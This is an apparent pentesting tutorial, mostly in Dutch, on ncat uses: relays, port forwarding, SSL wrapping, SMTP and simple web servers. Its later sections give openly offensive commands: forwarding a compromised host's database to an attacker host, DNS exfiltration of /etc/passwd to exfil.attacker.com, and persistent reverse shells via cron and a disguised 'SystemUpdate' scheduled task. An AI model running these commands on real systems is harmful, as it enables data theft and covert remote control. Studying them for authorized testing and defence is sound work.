## 🔗 Chaining Ncats Together

Ncat werkt **perfect in pipelines** — output van één ncat kan input worden van een andere.

### Simple Chain — Multi-Hop Relay

**Scenario:** Transfer file van host1 → host2 → host3

```
host1 (sender) ──► host2 (relay) ──► host3 (receiver)
```

**Host3 (receiver):**
```bash
ncat -l 31337 > log.txt
```

**Host2 (relay):**
```bash
ncat -l 31337 | ncat host3 31337
```

**Host1 (sender):**
```bash
ncat --send-only host2 31337 < log.txt
```

**Data flow:**
`log.txt` → ncat (host1) → ncat (host2 listener) → ncat (host2 client) → ncat (host3 listener) → `log.txt`

---

### Bidirectional Chain

**Probleem:** Simple chain is **one-way** (host1 kan sturen, maar niet ontvangen).

**Oplossing:** Use `--sh-exec` voor bidirectional relay:

**Host2 (relay met exec):**
```bash
ncat -l --sh-exec "ncat host3 31337" 31337
```

**Nu:**
- host1 → host2 → host3 (outbound)
- host3 → host2 → host1 (inbound)

::tip
**Use case:** Shell access via multi-hop pivot — commands én responses gaan door relay.
::

## 🌐 Port Forwarding

### Local Port Forward

**Scenario:** Forward `localhost:8080` naar `example.org:80`

```bash
ncat -l localhost 8080 --sh-exec "ncat example.org 80"
```

**Test:**
```bash
curl http://localhost:8080/
# Traffic: curl → localhost:8080 → ncat relay → example.org:80
```

**Use case:**
- Access remote service via local port
- Bypass firewall restrictions
- Test applications locally

---

### Remote Port Forward

**Scenario:** Compromised host kan **outbound** maar niet **inbound**. Forward internal service naar attacker.

**Attacker (listener):**
```bash
ncat -l 8080
```

**Compromised host (forward internal DB naar attacker):**
```bash
ncat -l localhost 3306 --sh-exec "ncat attacker.ip 8080"
```

**Trigger:**
```bash
# Op compromised host:
mysql -h localhost -P 3306
# Traffic: mysql → localhost:3306 → ncat → attacker:8080
```

## 🔓 SSL Unwrapping

### Scenario: Non-SSL Client → SSL Server

**Probleem:** Je mail client ondersteunt geen SSL, maar IMAP server vereist SSL.

**Oplossing:** Ncat als SSL wrapper.

```
Mail Client ──► Ncat (localhost) ──(SSL)──► IMAP Server
```

**Setup:**
```bash
ncat -l localhost 143 --sh-exec "ncat --ssl imap.example.com 993"
```

**Configure mail client:**
- Server: `localhost`
- Port: `143` (plain IMAP)
- SSL: **disabled**

**What happens:**
1. Client connects plaintext naar `localhost:143`
2. Ncat forwards **encrypted** naar `imap.example.com:993`
3. Server responses komen encrypted terug
4. Ncat decrypts en stuurt plaintext naar client

::warning
**Security notice:** Localhost traffic is plaintext — only use op trusted machines!
::

## 🌍 Send Email Via SMTP

Handmatig email sturen door raw SMTP protocol:

```bash
$ ncat -C mail.example.com 25
220 mail.example.com ESMTP
HELO client.example.com
250 mail.example.com Hello client.example.com
MAIL FROM:sender@example.com
250 OK
RCPT TO:recipient@example.com
250 Accepted
DATA
354 Enter message, ending with "." on a line by itself
From: sender@example.com
To: recipient@example.com
Subject: Test from Ncat

This is a test message sent via ncat!
.
250 OK
QUIT
221 mail.example.com closing connection
```

::note
**Use `-C` flag** voor CRLF line endings (vereist door SMTP).
::

**Automated SMTP:**
```bash
{
echo "HELO client.example.com"
echo "MAIL FROM:sender@example.com"
echo "RCPT TO:recipient@example.com"
echo "DATA"
echo "From: sender@example.com"
echo "To: recipient@example.com"
echo "Subject: Automated Test"
echo ""
echo "This is automated."
echo "."
echo "QUIT"
} | ncat -C mail.example.com 25
```

## 🌐 Simple Web Server

### Method 1: Single Response (sh-exec)

```bash
ncat -lk -p 8080 --sh-exec "echo -e 'HTTP/1.1 200 OK\r\n'; cat index.html"
```

**Windows variant:**
```cmd
ncat -lk -p 8080 --sh-exec "echo HTTP/1.1 200 OK& echo(&type index.html"
```

**Test:**
```bash
curl http://localhost:8080/
```

::caution
Serves **same file** regardless of URL — very basic!
::

---

### Method 2: Lua HTTP Server

**httpd.lua** (simplified):
```lua
-- Read request
local request = io.read("*l")

-- Send response
io.write("HTTP/1.0 200 OK\r\n")
io.write("Content-Type: text/html\r\n")
io.write("\r\n")
io.write("<html><body><h1>Hello from Ncat Lua!</h1></body></html>\r\n")
```

**Run:**
```bash
ncat --lua-exec httpd.lua --listen 8080 --keep-open
```

::tip
Voor full HTTP server, use Nmap's `httpd.lua` in `ncat/scripts/` — supports routing, files, etc.
::

## 🔐 SSH Through Ncat Tunnel

### Scenario: SSH Naar Host Behind NAT

**Setup:** SSH via intermediate "router" zonder port forwarding.

```
Laptop ──(SSH tunnel)──► Router ──(ncat)──► Internal Host
```

**Command:**
```bash
ssh -o ProxyCommand="ssh -q router ncat %h %p" internal-host
```

**Hoe het werkt:**
1. `ssh router` — Connect naar router
2. `ncat %h %p` — Runs op router, connects naar internal host
3. SSH traffic tunneled via router's ncat

**Variables:**
- `%h` — Target hostname (vervangen door `internal-host`)
- `%p` — Target port (default 22)

## 🔬 Nmap Version Detection Analysis

**Zie wat Nmap's version detection doet:**

```bash
# Start listener met hex dump:
ncat -l --keep-open 5200 --hex-dump vscan.log > /dev/null

# In andere terminal:
nmap -d -sV --version-all localhost -p 5200
```

**vscan.log toont:**
```
[0000] 0D 0A 0D 0A ....
[0000] 47 45 54 20 2F 20 48 54 54 50 2F 31 2E 30 0D 0A GET / HT TP/1.0..
[0010] 0D 0A ..
[0000] 4F 50 54 49 4F 4E 53 20 2F 20 48 54 54 50 2F 31 OPTIONS / HTTP/1
[0010] 2E 30 0D 0A 0D 0A .0....
```

Je ziet **alle Nmap version probes**:
- NULL probe
- GenericLines (`\r\n\r\n`)
- HTTP GET
- HTTP OPTIONS
- RTSP OPTIONS
- RPC probes
- DNS queries
- SMTP EHLO

::note
**Educational tool** — zie low-level protocol interactions.
::

## 💾 Data Exfiltration Techniques

### Exfiltrate Via DNS (Covert Channel)

**Niet direct met ncat, maar combineer met tools:**

```bash
# Encode data:
cat /etc/passwd | base64 | fold -w 32 > chunks.txt

# Send via DNS queries (requires DNS server control):
while read chunk; do
    nslookup $chunk.exfil.attacker.com
done < chunks.txt
```

---

### Exfiltrate Via ICMP (Ping)

**Use ncat om data te relay naar ICMP tunnel:**

```bash
# Requires tools like ptunnel or icmpsh
# Ncat kan de data feed:
tar czf - /sensitive/data | ncat relay-host 4444
```

## 🔄 Persistent Reverse Shell

**Cron job voor automated callback:**

```bash
# Add to crontab (Linux):
*/5 * * * * ncat attacker.ip 4444 -e /bin/bash
```

**Windows (Task Scheduler):**
```cmd
schtasks /create /tn "SystemUpdate" /tr "ncat.exe attacker.ip 4444 -e cmd.exe" /sc minute /mo 5
```

::warning
**Detection risk:** Persistent mechanisms zijn **zeer luid** — use met voorzichtigheid en alleen in authorized engagements!
::
